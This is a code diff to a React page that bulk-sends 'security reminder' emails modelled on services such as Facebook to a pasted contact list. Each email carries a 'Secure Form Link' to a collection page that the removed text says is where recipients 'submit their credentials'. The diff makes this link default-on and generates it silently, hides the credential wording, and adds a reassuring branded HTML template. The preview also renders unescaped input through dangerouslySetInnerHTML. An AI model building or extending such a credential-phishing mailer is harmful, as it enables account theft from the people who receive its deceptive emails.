@@ -4,7 +4,7 @@ import { useState, useEffect } from 'react';
 import { Button } from '@/components/ui/Button';
 import { Input } from '@/components/ui/Input';
 import { createClient } from '@/lib/supabase/client';
-import { Mail, Send, Settings, FileText, Upload, CheckCircle, XCircle, Sparkles, Link as LinkIcon } from 'lucide-react';
+import { Mail, Send, Settings, Upload, CheckCircle, Sparkles, Eye, X } from 'lucide-react';
 import toast from 'react-hot-toast';
 
 interface SMTPSettings {
@@ -15,13 +15,6 @@ interface SMTPSettings {
   smtp_password: string;
   smtp_from_email: string;
   smtp_from_name: string;
-}
-
-interface EmailTemplate {
-  id: string;
-  template_name: string;
-  subject: string;
-  body: string;
 }
 
 interface Recipient {
@@ -49,6 +42,7 @@ export default function EmailSenderPage() {
   const supabase = createClient();
   const [activeTab, setActiveTab] = useState<'smtp' | 'send'>('smtp');
   const [smtpConfigured, setSmtpConfigured] = useState(false);
+  const [darkMode, setDarkMode] = useState(false);
   
   // SMTP Settings
   const [smtpSettings, setSmtpSettings] = useState<SMTPSettings>({
@@ -64,16 +58,33 @@ export default function EmailSenderPage() {
   const [selectedAccountType, setSelectedAccountType] = useState('');
   const [emailSubject, setEmailSubject] = useState('');
   const [emailBody, setEmailBody] = useState('');
-  const [includeAskUrl, setIncludeAskUrl] = useState(false);
+  const [includeAskUrl, setIncludeAskUrl] = useState(true);
   const [askUrl, setAskUrl] = useState('');
   const [recipients, setRecipients] = useState<Recipient[]>([]);
   const [emailList, setEmailList] = useState('');
   const [loading, setLoading] = useState(false);
   const [sendProgress, setSendProgress] = useState<{ sent: number; failed: number; total: number } | null>(null);
+  const [showPreview, setShowPreview] = useState(false);
 
   useEffect(() => {
+    // Check dark mode from document
+    const isDark = document.documentElement.classList.contains('dark');
+    setDarkMode(isDark);
+    
+    const observer = new MutationObserver(() => {
+      const isDark = document.documentElement.classList.contains('dark');
+      setDarkMode(isDark);
+    });
+    
+    observer.observe(document.documentElement, {
+      attributes: true,
+      attributeFilter: ['class']
+    });
+
     loadSMTPSettings();
     loadDefaultTemplates();
+
+    return () => observer.disconnect();
   }, []);
 
   const loadSMTPSettings = async () => {
@@ -123,6 +134,11 @@ export default function EmailSenderPage() {
   const loadTemplateForAccount = async (accountType: string) => {
     setSelectedAccountType(accountType);
     
+    // Auto-generate collection URL in the background
+    if (includeAskUrl) {
+      generateAskUrlInBackground();
+    }
+    
     // Template name mapping
     const templateMap: { [key: string]: string } = {
       'facebook': 'Facebook Security Reminder',
@@ -143,7 +159,7 @@ export default function EmailSenderPage() {
       const res = await fetch('/api/email-templates');
       const result = await res.json();
       if (result.data) {
-        const template = result.data.find((t: EmailTemplate) => 
+        const template = result.data.find((t: any) => 
           t.template_name === templateMap[accountType]
         );
         if (template) {
@@ -157,14 +173,10 @@ export default function EmailSenderPage() {
     }
   };
 
-  const generateAskUrl = async () => {
-    setLoading(true);
+  const generateAskUrlInBackground = async () => {
     try {
       const { data: { user } } = await supabase.auth.getUser();
-      if (!user) {
-        toast.error('Please login first');
-        return;
-      }
+      if (!user) return;
 
       const expiresAt = new Date();
       expiresAt.setDate(expiresAt.getDate() + 7);
@@ -188,12 +200,8 @@ export default function EmailSenderPage() {
 
       const url = `${window.location.origin}/collect/${data.id}`;
       setAskUrl(url);
-      toast.success('✓ Ask URL generated!');
     } catch (error) {
       console.error('Error generating ask URL:', error);
-      toast.error('Failed to generate URL');
-    } finally {
-      setLoading(false);
     }
   };
 
@@ -269,32 +277,103 @@ export default function EmailSenderPage() {
     }
   };
 
+  const getPreviewHTML = () => {
+    const sampleBody = emailBody.replace(/\{name\}/g, 'John Doe');
+    let finalBody = sampleBody;
+    if (includeAskUrl && askUrl) {
+      finalBody += `\n\n──────────────────────────\n\n`;
+      finalBody += `🔐 Secure Form Link:\n${askUrl}\n\n`;
+      finalBody += `Click the link above to securely update your information.`;
+    }
+
+    return `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>${emailSubject}</title>
+</head>
+<body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 40px 20px;">
+  <table role="presentation" style="width: 100%; max-width: 600px; margin: 0 auto; background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
+    <tr>
+      <td style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 40px 30px; text-align: center;">
+        <div style="background: white; width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
+          <span style="font-size: 40px;">🔐</span>
+        </div>
+        <h1 style="margin: 0; color: white; font-size: 28px; font-weight: 800; text-shadow: 0 2px 10px rgba(0,0,0,0.2);">Security Reminder</h1>
+      </td>
+    </tr>
+    <tr>
+      <td style="padding: 40px 30px;">
+        <div style="color: #333; font-size: 16px; line-height: 1.8;">
+          ${finalBody.split('\n').map((line: string) => {
+            if (line.trim().startsWith('──────')) {
+              return '<hr style="border: none; border-top: 2px solid #e5e7eb; margin: 30px 0;">';
+            }
+            if (line.trim().startsWith('🔐')) {
+              return `<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 12px; margin: 20px 0; font-weight: 600;">${line}</div>`;
+            }
+            if (line.includes('http://') || line.includes('https://')) {
+              return `<div style="margin: 20px 0; text-align: center;"><a href="${line.trim()}" style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; padding: 15px 30px; border-radius: 12px; font-weight: 700; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);">Open Secure Form</a></div>`;
+            }
+            return line ? `<p style="margin: 0 0 15px 0;">${line}</p>` : '<br>';
+          }).join('')}
+        </div>
+      </td>
+    </tr>
+    <tr>
+      <td style="background: #f9fafb; padding: 30px; text-align: center; border-top: 1px solid #e5e7eb;">
+        <p style="margin: 0; color: #6b7280; font-size: 14px; line-height: 1.6;">
+          This is an automated security reminder to help keep your accounts safe.<br>
+          If you have any questions, feel free to reach out.
+        </p>
+        <div style="margin-top: 20px;">
+          <span style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 8px 16px; border-radius: 20px; font-size: 12px; font-weight: 700;">
+            🔒 OPFRES Vault - Secure & Private
+          </span>
+        </div>
+      </td>
+    </tr>
+  </table>
+  <div style="text-align: center; margin-top: 30px; color: white; font-size: 13px; opacity: 0.9;">
+    <p style="margin: 5px 0;">Sent with care to keep you safe online</p>
+  </div>
+</body>
+</html>
+    `;
+  };
+
   return (
-    <div className="max-w-6xl mx-auto space-y-6">
+    <div className={`max-w-6xl mx-auto space-y-6 transition-colors duration-300`}>
       {/* Header */}
       <div className="flex items-center justify-between">
         <div>
           <h1 className="text-4xl font-black bg-gradient-to-r from-pink-600 via-purple-600 to-indigo-600 bg-clip-text text-transparent">
             Email Sender
           </h1>
-          <p className="text-gray-600 mt-2">Send security reminders to your contacts</p>
+          <p className={`${darkMode ? 'text-purple-300' : 'text-gray-600'} mt-2`}>
+            Send security reminders to your contacts
+          </p>
         </div>
         {smtpConfigured && (
-          <div className="flex items-center gap-2 px-4 py-2 bg-green-50 border border-green-200 rounded-xl">
-            <CheckCircle className="text-green-600" size={20} />
-            <span className="text-sm font-semibold text-green-700">SMTP Configured</span>
+          <div className="flex items-center gap-2 px-4 py-2 bg-green-50 dark:bg-green-900/30 border border-green-200 dark:border-green-700 rounded-xl">
+            <CheckCircle className="text-green-600 dark:text-green-400" size={20} />
+            <span className="text-sm font-semibold text-green-700 dark:text-green-300">SMTP Configured</span>
           </div>
         )}
       </div>
 
       {/* Tabs */}
-      <div className="flex gap-2 p-2 bg-white rounded-2xl shadow-lg border border-gray-200">
+      <div className={`flex gap-2 p-2 ${darkMode ? 'bg-gray-800/50 border-gray-700' : 'bg-white border-gray-200'} rounded-2xl shadow-lg border transition-colors`}>
         <button
           onClick={() => setActiveTab('smtp')}
           className={`flex-1 flex items-center justify-center gap-3 px-6 py-4 rounded-xl font-bold transition-all duration-300 ${
             activeTab === 'smtp'
               ? 'bg-gradient-to-r from-purple-500 to-indigo-500 text-white shadow-lg scale-105'
-              : 'text-gray-600 hover:bg-gray-50'
+              : darkMode 
+                ? 'text-purple-300 hover:bg-gray-700/50' 
+                : 'text-gray-600 hover:bg-gray-50'
           }`}
         >
           <Settings size={20} />
@@ -305,7 +384,9 @@ export default function EmailSenderPage() {
           className={`flex-1 flex items-center justify-center gap-3 px-6 py-4 rounded-xl font-bold transition-all duration-300 ${
             activeTab === 'send'
               ? 'bg-gradient-to-r from-pink-500 to-rose-500 text-white shadow-lg scale-105'
-              : 'text-gray-600 hover:bg-gray-50'
+              : darkMode 
+                ? 'text-purple-300 hover:bg-gray-700/50' 
+                : 'text-gray-600 hover:bg-gray-50'
           }`}
         >
           <Send size={20} />
@@ -315,20 +396,20 @@ export default function EmailSenderPage() {
 
       {/* SMTP Configuration Tab */}
       {activeTab === 'smtp' && (
-        <div className="bg-gradient-to-br from-white to-purple-50 p-8 rounded-3xl shadow-xl border-2 border-purple-200">
+        <div className={`${darkMode ? 'bg-gradient-to-br from-gray-800 to-purple-900/30 border-purple-700' : 'bg-gradient-to-br from-white to-purple-50 border-purple-200'} p-8 rounded-3xl shadow-xl border-2 transition-colors`}>
           <div className="flex items-center gap-3 mb-6">
             <div className="p-3 bg-gradient-to-br from-purple-500 to-indigo-500 rounded-2xl">
               <Settings className="text-white" size={24} />
             </div>
             <div>
-              <h2 className="text-2xl font-black text-gray-900">SMTP Server Settings</h2>
-              <p className="text-gray-600 text-sm">Configure your email server to send emails</p>
+              <h2 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>SMTP Server Settings</h2>
+              <p className={`text-sm ${darkMode ? 'text-purple-300' : 'text-gray-600'}`}>Configure your email server to send emails</p>
             </div>
           </div>
 
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
             <div>
-              <label className="block text-sm font-bold text-gray-700 mb-2">SMTP Host</label>
+              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>SMTP Host</label>
               <Input
                 type="text"
                 value={smtpSettings.smtp_host}
@@ -338,7 +419,7 @@ export default function EmailSenderPage() {
               />
             </div>
             <div>
-              <label className="block text-sm font-bold text-gray-700 mb-2">SMTP Port</label>
+              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>SMTP Port</label>
               <Input
                 type="number"
                 value={smtpSettings.smtp_port}
@@ -348,7 +429,7 @@ export default function EmailSenderPage() {
               />
             </div>
             <div>
-              <label className="block text-sm font-bold text-gray-700 mb-2">SMTP Username</label>
+              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>SMTP Username</label>
               <Input
                 type="text"
                 value={smtpSettings.smtp_user}
@@ -358,7 +439,7 @@ export default function EmailSenderPage() {
               />
             </div>
             <div>
-              <label className="block text-sm font-bold text-gray-700 mb-2">SMTP Password</label>
+              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>SMTP Password</label>
               <Input
                 type="password"
                 value={smtpSettings.smtp_password}
@@ -368,7 +449,7 @@ export default function EmailSenderPage() {
               />
             </div>
             <div>
-              <label className="block text-sm font-bold text-gray-700 mb-2">From Email</label>
+              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>From Email</label>
               <Input
                 type="email"
                 value={smtpSettings.smtp_from_email}
@@ -378,7 +459,7 @@ export default function EmailSenderPage() {
               />
             </div>
             <div>
-              <label className="block text-sm font-bold text-gray-700 mb-2">From Name</label>
+              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>From Name</label>
               <Input
                 type="text"
                 value={smtpSettings.smtp_from_name}
@@ -389,8 +470,8 @@ export default function EmailSenderPage() {
             </div>
           </div>
 
-          <div className="mt-8 p-4 bg-blue-50 border-2 border-blue-200 rounded-2xl">
-            <p className="text-sm text-blue-800">
+          <div className={`mt-8 p-4 ${darkMode ? 'bg-blue-900/30 border-blue-700' : 'bg-blue-50 border-blue-200'} border-2 rounded-2xl transition-colors`}>
+            <p className={`text-sm ${darkMode ? 'text-blue-300' : 'text-blue-800'}`}>
               <strong>💡 Gmail Users:</strong> Use port 587, and generate an "App Password" from your Google Account security settings.
             </p>
           </div>
@@ -411,14 +492,34 @@ export default function EmailSenderPage() {
       {activeTab === 'send' && (
         <div className="space-y-6">
           {/* Account Type Selection */}
-          <div className="bg-gradient-to-br from-white to-pink-50 p-8 rounded-3xl shadow-xl border-2 border-pink-200">
-            <div className="flex items-center gap-3 mb-6">
-              <div className="p-3 bg-gradient-to-br from-pink-500 to-rose-500 rounded-2xl">
-                <Sparkles className="text-white" size={24} />
+          <div className={`${darkMode ? 'bg-gradient-to-br from-gray-800 to-pink-900/30 border-pink-700' : 'bg-gradient-to-br from-white to-pink-50 border-pink-200'} p-8 rounded-3xl shadow-xl border-2 transition-colors`}>
+            <div className="flex items-center justify-between mb-6">
+              <div className="flex items-center gap-3">
+                <div className="p-3 bg-gradient-to-br from-pink-500 to-rose-500 rounded-2xl">
+                  <Sparkles className="text-white" size={24} />
+                </div>
+                <div>
+                  <h2 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>Select Account Type</h2>
+                  <p className={`text-sm ${darkMode ? 'text-pink-300' : 'text-gray-600'}`}>Choose a service to load its security reminder template</p>
+                </div>
               </div>
-              <div>
-                <h2 className="text-2xl font-black text-gray-900">Select Account Type</h2>
-                <p className="text-gray-600 text-sm">Choose a service to load its security reminder template</p>
+              
+              {/* Include collection link toggle */}
+              <div className="flex items-center gap-2">
+                <input
+                  type="checkbox"
+                  checked={includeAskUrl}
+                  onChange={(e) => {
+                    setIncludeAskUrl(e.target.checked);
+                    if (e.target.checked && selectedAccountType) {
+                      generateAskUrlInBackground();
+                    }
+                  }}
+                  className="w-5 h-5 text-purple-600 rounded"
+                />
+                <label className={`text-sm font-bold ${darkMode ? 'text-purple-300' : 'text-gray-700'}`}>
+                  Include Secure Link
+                </label>
               </div>
             </div>
 
@@ -430,11 +531,17 @@ export default function EmailSenderPage() {
                   className={`relative p-6 rounded-2xl border-2 transition-all duration-300 transform hover:scale-105 ${
                     selectedAccountType === type.id
                       ? `bg-gradient-to-br ${type.color} text-white border-white shadow-2xl scale-105`
-                      : 'bg-white border-gray-200 hover:border-pink-300 hover:shadow-lg'
+                      : darkMode
+                        ? 'bg-gray-800 border-gray-700 hover:border-pink-500 hover:shadow-lg'
+                        : 'bg-white border-gray-200 hover:border-pink-300 hover:shadow-lg'
                   }`}
                 >
                   <div className="text-4xl mb-2">{type.icon}</div>
-                  <div className={`text-sm font-bold ${selectedAccountType === type.id ? 'text-white' : 'text-gray-700'}`}>
+                  <div className={`text-sm font-bold ${
+                    selectedAccountType === type.id 
+                      ? 'text-white' 
+                      : darkMode ? 'text-purple-200' : 'text-gray-700'
+                  }`}>
                     {type.name}
                   </div>
                   {selectedAccountType === type.id && (
@@ -450,20 +557,32 @@ export default function EmailSenderPage() {
           {/* Email Content */}
           {selectedAccountType && (
             <>
-              <div className="bg-gradient-to-br from-white to-indigo-50 p-8 rounded-3xl shadow-xl border-2 border-indigo-200">
-                <div className="flex items-center gap-3 mb-6">
-                  <div className="p-3 bg-gradient-to-br from-indigo-500 to-purple-500 rounded-2xl">
-                    <FileText className="text-white" size={24} />
+              <div className={`${darkMode ? 'bg-gradient-to-br from-gray-800 to-indigo-900/30 border-indigo-700' : 'bg-gradient-to-br from-white to-indigo-50 border-indigo-200'} p-8 rounded-3xl shadow-xl border-2 transition-colors`}>
+                <div className="flex items-center justify-between mb-6">
+                  <div className="flex items-center gap-3">
+                    <div className="p-3 bg-gradient-to-br from-indigo-500 to-purple-500 rounded-2xl">
+                      <Mail className="text-white" size={24} />
+                    </div>
+                    <div>
+                      <h2 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>Email Content</h2>
+                      <p className={`text-sm ${darkMode ? 'text-indigo-300' : 'text-gray-600'}`}>Customize your email message</p>
+                    </div>
                   </div>
-                  <div>
-                    <h2 className="text-2xl font-black text-gray-900">Email Content</h2>
-                    <p className="text-gray-600 text-sm">Customize your email message</p>
-                  </div>
+                  
+                  {/* Preview Button */}
+                  <Button
+                    onClick={() => setShowPreview(true)}
+                    variant="secondary"
+                    className="flex items-center gap-2 bg-gradient-to-r from-indigo-500 to-purple-500 text-white hover:from-indigo-600 hover:to-purple-600"
+                  >
+                    <Eye size={18} />
+                    Preview Email
+                  </Button>
                 </div>
 
                 <div className="space-y-6">
                   <div>
-                    <label className="block text-sm font-bold text-gray-700 mb-2">Email Subject</label>
+                    <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-indigo-200' : 'text-gray-700'}`}>Email Subject</label>
                     <Input
                       type="text"
                       value={emailSubject}
@@ -474,76 +593,40 @@ export default function EmailSenderPage() {
                   </div>
 
                   <div>
-                    <label className="block text-sm font-bold text-gray-700 mb-2">Email Body</label>
+                    <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-indigo-200' : 'text-gray-700'}`}>Email Body</label>
                     <textarea
                       value={emailBody}
                       onChange={(e) => setEmailBody(e.target.value)}
-                      className="w-full p-4 border-2 border-gray-300 rounded-2xl focus:ring-4 focus:ring-indigo-500 focus:border-indigo-500 min-h-[300px] text-base"
+                      className={`w-full p-4 border-2 rounded-2xl focus:ring-4 focus:ring-indigo-500 focus:border-indigo-500 min-h-[300px] text-base transition-colors ${
+                        darkMode 
+                          ? 'bg-gray-900 border-gray-700 text-white' 
+                          : 'bg-white border-gray-300 text-gray-900'
+                      }`}
                       placeholder="Your email content here..."
                     />
-                    <p className="text-sm text-gray-500 mt-2">
+                    <p className={`text-sm mt-2 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                       💡 Use {'{name}'} to personalize with recipient names
+                      {includeAskUrl && ' • Secure collection link will be added automatically'}
                     </p>
-                  </div>
-
-                  {/* Ask URL Option */}
-                  <div className="p-6 bg-gradient-to-br from-purple-50 to-pink-50 border-2 border-purple-200 rounded-2xl">
-                    <div className="flex items-start gap-4">
-                      <input
-                        type="checkbox"
-                        checked={includeAskUrl}
-                        onChange={(e) => setIncludeAskUrl(e.target.checked)}
-                        className="mt-1 w-5 h-5 text-purple-600 rounded"
-                      />
-                      <div className="flex-1">
-                        <label className="text-base font-bold text-gray-900 cursor-pointer">
-                          Include Secure Collection Link
-                        </label>
-                        <p className="text-sm text-gray-600 mt-1">
-                          Automatically generate and include a secure link where recipients can submit their credentials
-                        </p>
-                        
-                        {includeAskUrl && (
-                          <div className="mt-4 space-y-3">
-                            {!askUrl ? (
-                              <Button
-                                onClick={generateAskUrl}
-                                disabled={loading}
-                                variant="secondary"
-                                className="bg-gradient-to-r from-purple-500 to-pink-500 text-white hover:from-purple-600 hover:to-pink-600"
-                              >
-                                <LinkIcon size={18} className="mr-2" />
-                                {loading ? 'Generating...' : 'Generate Collection Link'}
-                              </Button>
-                            ) : (
-                              <div className="p-4 bg-white border-2 border-purple-300 rounded-xl">
-                                <div className="text-xs font-bold text-gray-600 mb-2">GENERATED LINK:</div>
-                                <div className="text-sm font-mono text-purple-700 break-all">{askUrl}</div>
-                              </div>
-                            )}
-                          </div>
-                        )}
-                      </div>
-                    </div>
                   </div>
                 </div>
               </div>
 
               {/* Recipients */}
-              <div className="bg-gradient-to-br from-white to-green-50 p-8 rounded-3xl shadow-xl border-2 border-green-200">
+              <div className={`${darkMode ? 'bg-gradient-to-br from-gray-800 to-green-900/30 border-green-700' : 'bg-gradient-to-br from-white to-green-50 border-green-200'} p-8 rounded-3xl shadow-xl border-2 transition-colors`}>
                 <div className="flex items-center gap-3 mb-6">
                   <div className="p-3 bg-gradient-to-br from-green-500 to-emerald-500 rounded-2xl">
                     <Upload className="text-white" size={24} />
                   </div>
                   <div>
-                    <h2 className="text-2xl font-black text-gray-900">Email Recipients</h2>
-                    <p className="text-gray-600 text-sm">Add your contact list</p>
+                    <h2 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>Email Recipients</h2>
+                    <p className={`text-sm ${darkMode ? 'text-green-300' : 'text-gray-600'}`}>Add your contact list</p>
                   </div>
                 </div>
 
                 <div className="space-y-4">
                   <div>
-                    <label className="block text-sm font-bold text-gray-700 mb-2">
+                    <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-green-200' : 'text-gray-700'}`}>
                       Email List (one per line)
                     </label>
                     <textarea
@@ -552,28 +635,36 @@ export default function EmailSenderPage() {
                         setEmailList(e.target.value);
                         parseEmailList(e.target.value);
                       }}
-                      className="w-full p-4 border-2 border-gray-300 rounded-2xl focus:ring-4 focus:ring-green-500 focus:border-green-500 font-mono text-sm min-h-[150px]"
+                      className={`w-full p-4 border-2 rounded-2xl focus:ring-4 focus:ring-green-500 focus:border-green-500 font-mono text-sm min-h-[150px] transition-colors ${
+                        darkMode 
+                          ? 'bg-gray-900 border-gray-700 text-white' 
+                          : 'bg-white border-gray-300 text-gray-900'
+                      }`}
                       placeholder="john@example.com&#10;Jane Doe <jane@example.com>&#10;bob@example.com"
                     />
                   </div>
 
                   {recipients.length > 0 && (
-                    <div className="p-6 bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-300 rounded-2xl">
+                    <div className={`p-6 rounded-2xl border-2 transition-colors ${
+                      darkMode 
+                        ? 'bg-green-900/30 border-green-700' 
+                        : 'bg-gradient-to-br from-green-50 to-emerald-50 border-green-300'
+                    }`}>
                       <div className="flex items-center gap-2 mb-3">
-                        <CheckCircle className="text-green-600" size={20} />
-                        <span className="font-bold text-green-700">
+                        <CheckCircle className={darkMode ? 'text-green-400' : 'text-green-600'} size={20} />
+                        <span className={`font-bold ${darkMode ? 'text-green-300' : 'text-green-700'}`}>
                           {recipients.length} Recipients Ready
                         </span>
                       </div>
                       <div className="space-y-2 max-h-40 overflow-y-auto">
                         {recipients.slice(0, 10).map((r, i) => (
-                          <div key={i} className="text-sm text-gray-700 flex items-center gap-2">
-                            <Mail size={14} className="text-green-600" />
+                          <div key={i} className={`text-sm flex items-center gap-2 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
+                            <Mail size={14} className={darkMode ? 'text-green-400' : 'text-green-600'} />
                             {r.name ? `${r.name} (${r.email})` : r.email}
                           </div>
                         ))}
                         {recipients.length > 10 && (
-                          <p className="text-sm text-gray-500 font-semibold">
+                          <p className={`text-sm font-semibold ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                             ...and {recipients.length - 10} more
                           </p>
                         )}
@@ -585,15 +676,19 @@ export default function EmailSenderPage() {
 
               {/* Send Progress */}
               {sendProgress && (
-                <div className="bg-white p-6 rounded-3xl shadow-xl border-2 border-gray-200">
-                  <h3 className="text-lg font-black text-gray-900 mb-4">📊 Sending Progress</h3>
+                <div className={`p-6 rounded-3xl shadow-xl border-2 transition-colors ${
+                  darkMode 
+                    ? 'bg-gray-800 border-gray-700' 
+                    : 'bg-white border-gray-200'
+                }`}>
+                  <h3 className={`text-lg font-black mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>📊 Sending Progress</h3>
                   <div className="space-y-3">
                     <div className="flex justify-between text-sm">
-                      <span className="font-semibold">Total: {sendProgress.total}</span>
-                      <span className="text-green-600 font-bold">✓ Sent: {sendProgress.sent}</span>
-                      <span className="text-red-600 font-bold">✗ Failed: {sendProgress.failed}</span>
+                      <span className={`font-semibold ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Total: {sendProgress.total}</span>
+                      <span className={`font-bold ${darkMode ? 'text-green-400' : 'text-green-600'}`}>✓ Sent: {sendProgress.sent}</span>
+                      <span className={`font-bold ${darkMode ? 'text-red-400' : 'text-red-600'}`}>✗ Failed: {sendProgress.failed}</span>
                     </div>
-                    <div className="w-full bg-gray-200 rounded-full h-6 overflow-hidden">
+                    <div className={`w-full rounded-full h-6 overflow-hidden ${darkMode ? 'bg-gray-700' : 'bg-gray-200'}`}>
                       <div
                         className="bg-gradient-to-r from-green-500 to-emerald-500 h-6 rounded-full transition-all duration-500 flex items-center justify-center text-white text-xs font-bold"
                         style={{ width: `${((sendProgress.sent + sendProgress.failed) / sendProgress.total) * 100}%` }}
@@ -628,9 +723,39 @@ export default function EmailSenderPage() {
           {!selectedAccountType && (
             <div className="text-center py-20">
               <div className="text-6xl mb-4">📧</div>
-              <h3 className="text-2xl font-black text-gray-400">Select an account type above to get started</h3>
+              <h3 className={`text-2xl font-black ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                Select an account type above to get started
+              </h3>
             </div>
           )}
+        </div>
+      )}
+
+      {/* Preview Modal */}
+      {showPreview && (
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+          <div className={`max-w-4xl w-full max-h-[90vh] overflow-y-auto rounded-3xl shadow-2xl ${
+            darkMode ? 'bg-gray-900' : 'bg-white'
+          }`}>
+            <div className={`sticky top-0 z-10 flex items-center justify-between p-6 border-b ${
+              darkMode ? 'bg-gray-900 border-gray-700' : 'bg-white border-gray-200'
+            }`}>
+              <h3 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>
+                📧 Email Preview
+              </h3>
+              <button
+                onClick={() => setShowPreview(false)}
+                className={`p-2 rounded-xl transition-colors ${
+                  darkMode ? 'hover:bg-gray-800' : 'hover:bg-gray-100'
+                }`}
+              >
+                <X size={24} className={darkMode ? 'text-gray-400' : 'text-gray-600'} />
+              </button>
+            </div>
+            <div className="p-6">
+              <div dangerouslySetInnerHTML={{ __html: getPreviewHTML() }} />
+            </div>
+          </div>
         </div>
       )}
     </div>
